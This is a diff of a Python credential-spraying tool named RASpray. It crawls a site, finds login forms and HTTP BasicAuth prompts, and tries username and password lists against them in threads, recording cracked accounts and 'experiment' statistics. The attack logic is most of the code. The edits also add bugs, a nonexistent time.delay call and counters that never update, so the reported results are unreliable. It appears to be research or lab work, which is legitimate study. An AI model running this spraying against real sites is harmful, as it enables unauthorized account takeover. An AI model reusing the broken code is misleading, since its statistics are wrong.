@@ -13,6 +13,7 @@ from colorama import Fore, Style, init
 import time
 import itertools
 from datetime import datetime
+
 from threading import Thread
 import urllib3
 
@@ -21,14 +22,12 @@ TOOL_NAME = "RASpray"
 VERSION = "1.0.0"
 
 # Global variables for tracking experiment data
-global total_attempts 
-global successful_attempts
-global total_pages_field
-total_pages_field = 0
 total_attempts = 0
 successful_attempts = 0
 start_time = None
 memory_usage_per_phase = []
+
+
 
 # Get the current process for tracking program-specific resource usage
 process = psutil.Process(os.getpid())
@@ -55,7 +54,7 @@ def end_timer():
 # Function to display the RASPRAY banner
 def display_banner():
     banner = r"""
-        
+    
     ██████╗  █████╗     ███████╗██████╗ ██████╗  █████╗ ██╗   ██╗
     ██╔══██╗██╔══██╗    ██╔════╝██╔══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝
     ██████╔╝███████║    ███████╗██████╔╝██████╔╝███████║ ╚████╔╝ 
@@ -66,7 +65,7 @@ def display_banner():
     Version: 1.0.0
     """
     print(f"{Fore.RED}{banner}{Style.RESET_ALL}")
-    
+
 # Function to display help message
 def display_help():
     """
@@ -101,14 +100,13 @@ def display_help():
         --password-special-chars    Require at least 1 special character in passwords (e.g., !, @, #)
     """
     print(help_text)
-    
+
 # Function to display the version
 def display_version():
     """
     Displays the current version of the tool.
     """
     print(f"{TOOL_NAME} version {VERSION}")
-    
 
 # Function to traverse a website and find password fields or BasicAuth requests
 def traverse_website(base_url, session, max_depth=3):
@@ -188,6 +186,8 @@ def is_password_requested_basic_auth(url, session):
         return False
     
 
+    
+    
 def is_password_requested_basic_password_field(url, session):
     """
     Checks if the given page contains an input field for a password.
@@ -493,79 +493,83 @@ def extract_failure_reason(html_content):
     # Join the extracted error messages into a single string
     return ' | '.join(error_texts)
 
-def basic_auth_spray(full_url, password, username, session, successful_cracks, failed_cracks):
-    global total_attempts, successful_attempts  # Declare the variables as global
+def basic_auth_spray(full_url, password, username, session, successful_cracks, failed_cracks, total_attempts, successful_attempts):
     try:
+        #print(f"{Fore.WHITE}Trying BasicAuth with username: {username} and password: {password}")
         response = session.get(full_url, auth=HTTPBasicAuth(username, password))
-        total_attempts += 1  # Increment total attempts
+        total_attempts = total_attempts+1
         if response.status_code == 200:
             print(f"{Fore.GREEN}Success! BasicAuth credentials: Username: {username}, Password: {password} on {full_url}")
             successful_cracks.append((full_url, username, password))
-            successful_attempts += 1  # Increment successful attempts
+            successful_attempts = successful_attempts +1
             return
         else:
+            """# Print a more detailed error reason based on the response code
+            if response.status_code == 401:
+                print(f"{Fore.RED}Failed! Unauthorized (401) with Username: {username}, Password: {password} on {full_url}")
+            elif response.status_code == 403:
+                print(f"{Fore.RED}Failed! Forbidden (403) with Username: {username}, Password: {password} on {full_url}")
+            else:
+                print(f"{Fore.RED}Failed! BasicAuth with Username: {username}, Password: {password} on {full_url} Reason: {response.reason}")
+            """
             failed_cracks.append((full_url, username, password))
+
     except (Timeout, ConnectionError):
         print(f"Connection failed for {full_url}")
         time.sleep(1)
     except RequestException as e:
         print(f"An error occurred: {e}")
 
-
-def password_field_spray(full_url, password, username, session, successful_cracks, failed_cracks):
-    global total_attempts, successful_attempts  # Declare the variables as global
+def password_field_spray(full_url, password, username, session, successful_cracks, failed_cracks, total_attempts, successful_attempts):
+    #log_resource_usage("Attempting a combination","")
     try:
+        #print(f"{Fore.WHITE}Trying username: {username} and password: {password}")
         credentials = attempt_login_with_form(full_url, session, username, password)
-        total_attempts += 1  # Increment total attempts
+        total_attempts = total_attempts+1
 
         if credentials:
-            successful_attempts += 1  # Increment successful attempts
+            #print(f"{Fore.GREEN}Success! Username: {credentials[0]}, Password: {credentials[1]} on {full_url}")
+            successful_attempts = successful_attempts +1
             successful_cracks.append((full_url, credentials[0], credentials[1]))
             return
         else:
             failed_cracks.append((full_url, username, password))
     except (Timeout, ConnectionError):
-        time.sleep(0.5)
+        time.delay(0.5)
         print(f"Connection failed for {full_url}")
     except RequestException as e:
         print(f"An error occurred: {e}")
 
-
-def single_spray(full_url, passwords, usernames, session, successful_cracks, failed_cracks):
-    global total_pages_field  # Declare total_pages_field as global
-    
+def single_spray(full_url, passwords, usernames, session, successful_cracks, failed_cracks, total_attempts, successful_attempts, total_pages_field):
     # Check if the page has a password field (form-based authentication)
-    if is_password_requested_basic_password_field(full_url, session):
-        total_pages_field += 1  # Increment for checking this page
-        for password in passwords:
-            threads = []
-            for username in usernames:
-                tsub = Thread(target=password_field_spray, args=(full_url, password, username, session, successful_cracks, failed_cracks))
-                threads.append(tsub)
-            for thread in threads:
-                thread.start()
-            for thread in threads:
-                thread.join()
+        if is_password_requested_basic_password_field(full_url, session):
+            total_pages_field +=1
+            for password in passwords:
+                threads = []
+                for username in usernames:
+                    tsub = Thread(target=password_field_spray, args=(full_url, password, username, session, successful_cracks, failed_cracks, total_attempts, successful_attempts))
+                    threads.append(tsub)    
+                for thread in threads:
+                    thread.start()
+                for thread in threads:   
+                    thread.join()
 
-    if is_password_requested_basic_auth(full_url, session):
-        total_pages_field += 1  # Increment for checking this page
-        for password in passwords:
-            threads = []
-            for username in usernames:
-                tsub = Thread(target=basic_auth_spray, args=(full_url, password, username, session, successful_cracks, failed_cracks))
-                threads.append(tsub)
-            for thread in threads:
-                thread.start()
-            for thread in threads:
-                thread.join()
-
-
-
+        if is_password_requested_basic_auth(full_url, session):
+            total_pages_field +=1
+            for password in passwords:
+                threads = []
+                for username in usernames:
+                    tsub = Thread(target=basic_auth_spray, args=(full_url, password, username, session, successful_cracks, failed_cracks, total_attempts, successful_attempts))
+                    threads.append(tsub)    
+                for thread in threads:
+                    thread.start()
+                for thread in threads:   
+                    thread.join()
 # Modify the password_spraying function to include bruteforce and character substitution
 def password_spraying(ip_address, username_file, password_file, criteria):
-    global total_attempts, successful_attempts, total_pages_field  # Declare all as global
     successful_cracks = []
     failed_cracks = []
+    global total_attempts, successful_attempts
 
     # Open the username and password files
     with open(username_file, 'r') as user_file:
@@ -599,19 +603,39 @@ def password_spraying(ip_address, username_file, password_file, criteria):
     pages_to_check = traverse_website(base_url, session)
     pages_to_check = list(set(pages_to_check))  # Remove duplicates
 
-    start_timer()
-    log_resource_usage("Initial Connection", "")
     
+    start_timer()
+    log_resource_usage("Initial Connection","")
+    t = []
+    total_pages_field = 0 # stores the total number of pages that have any authentication fields
     for page in pages_to_check:        
         full_url = urljoin(base_url, page)
+        credentials_found = False  # Flag to stop further attempts once successful
+
         print("This is the full URL", full_url)
         log_resource_usage("Login at page", full_url)
         
-        # Check if the page has authentication fields and update the total pages checked
-        single_spray(full_url, passwords, usernames, session, successful_cracks, failed_cracks)
+        single_spray(full_url, passwords, usernames, session, successful_cracks, failed_cracks, total_attempts, successful_attempts, total_pages_field)
+
 
     duration = end_timer()  
 
+    """        
+    # After exhausting all combinations, ask if the user wants to proceed with bruteforce
+    if ask_for_bruteforce():
+        perform_bruteforce(username_file, password_file, ip_address, criteria, session, pages_to_check)
+    """
+  
+    if failed_cracks:
+        print(f"{Fore.RED}Failed pages that required a password:")
+        for page, user, pwd in failed_cracks:
+            print(f"{Fore.WHITE}Page: {page}, Username: {user}, Password: {pwd}")
+
+    if failed_cracks: ### if uncommenting the code above when debugging, make sure to comment this if statement (not the else)
+        pass
+    else:
+        print(f"{Fore.GREEN}No failed password cracking attempts.")
+    
     # Summary of Cracking Attempts
     print(f"{Fore.WHITE}\n--- Summary of Cracking Attempts ---")
     if successful_cracks:
@@ -620,16 +644,23 @@ def password_spraying(ip_address, username_file, password_file, criteria):
             print(f"{Fore.WHITE}Page: {page}, Username: {user}, Password: {pwd}")
     else:
         print(f"{Fore.RED}No successful cracking attempts.")
+    
+    try:
+        print(f"{Fore.YELLOW}\n======== Experiment Summary ========{Style.RESET_ALL}")
+        print(f"Total Attempts: {total_attempts}")
+        print(f"Successful Attempts: {successful_attempts}")
+        print(f"Total Pages Checked: {total_pages_field}")
+        print(f"Success Rate: {successful_attempts / total_pages_field * 100:.2f}%")
+        print(f"Duration of Experiment: {duration} seconds")
+        print(f"Average Duration per Attempt: {duration / total_attempts:.4f} seconds")
+    except ZeroDivisionError:
+        print(f"{Fore.RED}No pages with authentication fields found.")
 
-    # Experiment Summary
-    print(f"{Fore.YELLOW}\n======== Experiment Summary ========{Style.RESET_ALL}")
-    print(f"Total Attempts: {total_attempts}")
-    print(f"Successful Attempts: {successful_attempts}")
-    print(f"Total Pages Checked: {total_pages_field}")
-    print(f"Success Rate: {successful_attempts / total_pages_field * 100:.2f}%" if total_pages_field > 0 else "Success Rate: N/A")
-    print(f"Duration of Experiment: {duration} seconds")
-    print(f"Average Duration per Attempt: {duration / total_attempts:.4f} seconds" if total_attempts > 0 else "Average Duration per Attempt: N/A")
-
+    # Resource Utilization Summary
+    print(f"{Fore.YELLOW}\n--- Resource Utilization ---{Style.RESET_ALL}")
+    for i, (phase, memory) in enumerate(memory_usage_per_phase):
+        memory = memory_usage_per_phase[i][1]  # Access the corresponding memory usage
+        print(f"{Fore.CYAN}{phase} - Memory: {memory}%")
 
 
 
@@ -686,4 +717,3 @@ def main():
 
 if __name__ == '__main__':
     main()
-
